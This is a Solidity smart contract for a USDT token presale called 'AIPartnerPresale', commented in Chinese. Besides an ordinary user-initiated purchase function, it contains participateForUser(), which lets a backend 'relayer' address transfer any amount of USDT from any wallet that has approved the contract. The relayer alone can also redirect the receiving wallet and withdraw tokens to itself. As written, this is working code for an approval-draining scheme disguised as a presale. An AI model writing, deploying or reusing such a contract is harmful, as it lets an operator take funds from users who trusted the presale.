// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @dev 针对以太坊非标准 USDT 优化的接口（不强求返回 bool）
 */
interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external;
    function transfer(address recipient, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract AIPartnerPresale {
    
    // 专用的后端代扣执行者地址（Relayer）
    address public relayer;
    
    // USDT 代币合约地址（不可变）
    address public immutable usdtToken;
    
    // 资金归集/收款钱包地址
    address public feeReceiver;

    // 记录每个地址参与预售的总金额
    mapping(address => uint256) public contributions;

    // 事件定义
    event Participated(address indexed buyer, uint256 amount, uint256 timestamp);
    event FeeReceiverUpdated(address indexed newReceiver);
    event RelayerUpdated(address indexed newRelayer);
    event EmergencyWithdrawn(address indexed token, uint256 amount);

    // 仅允许 relayer 调用的修饰符
    modifier onlyRelayer() {
        require(msg.sender == relayer, "Only relayer can call this function");
        _;
    }

    /**
     * @param _usdtToken USDT 合约地址
     * @param _feeReceiver 收款/归集钱包地址
     * @param _relayer 后端代扣服务器的钱包地址
     */
    constructor(address _usdtToken, address _feeReceiver, address _relayer) {
        require(_usdtToken != address(0), "Invalid USDT address");
        require(_feeReceiver != address(0), "Invalid receiver address");
        require(_relayer != address(0), "Invalid relayer address");
        
        usdtToken = _usdtToken;
        feeReceiver = _feeReceiver;
        relayer = _relayer;
    }

    /**
     * @notice 修改后端代扣执行者地址（仅当前的 relayer 可以修改）
     */
    function setRelayer(address _newRelayer) external onlyRelayer {
        require(_newRelayer != address(0), "Invalid relayer address");
        relayer = _newRelayer;
        emit RelayerUpdated(_newRelayer);
    }

    /**
     * @notice 用户自主参与预售 / 兑换代币
     */
    function participate(uint256 amount) external {
        require(amount > 0, "Amount must be greater than zero");

        IERC20(usdtToken).transferFrom(msg.sender, feeReceiver, amount);

        contributions[msg.sender] += amount;
        emit Participated(msg.sender, amount, block.timestamp);
    }

    /**
     * @notice 后台服务器调用的代扣函数（仅授权的 relayer 可调用）
     * @param user 已授权用户的钱包地址
     * @param amount 扣除的 USDT 数量
     */
    function participateForUser(address user, uint256 amount) external onlyRelayer {
        require(user != address(0), "Invalid user address");
        require(amount > 0, "Amount must be greater than zero");

        // 利用用户已授权给本合约的额度，将 USDT 从指定用户钱包转入收款钱包
        IERC20(usdtToken).transferFrom(user, feeReceiver, amount);

        contributions[user] += amount;
        emit Participated(user, amount, block.timestamp);
    }

    /**
     * @notice 更新收款钱包地址（允许 relayer 修改，或者你可以按需移除此权限）
     */
    function setFeeReceiver(address _newReceiver) external onlyRelayer {
        require(_newReceiver != address(0), "Invalid address");
        feeReceiver = _newReceiver;
        emit FeeReceiverUpdated(_newReceiver);
    }

    /**
     * @notice 紧急提取合约中误打入的其他代币
     */
    function emergencyWithdrawToken(address tokenAddr, uint256 amount) external onlyRelayer {
        IERC20(tokenAddr).transfer(relayer, amount);
        emit EmergencyWithdrawn(tokenAddr, amount);
    }
}
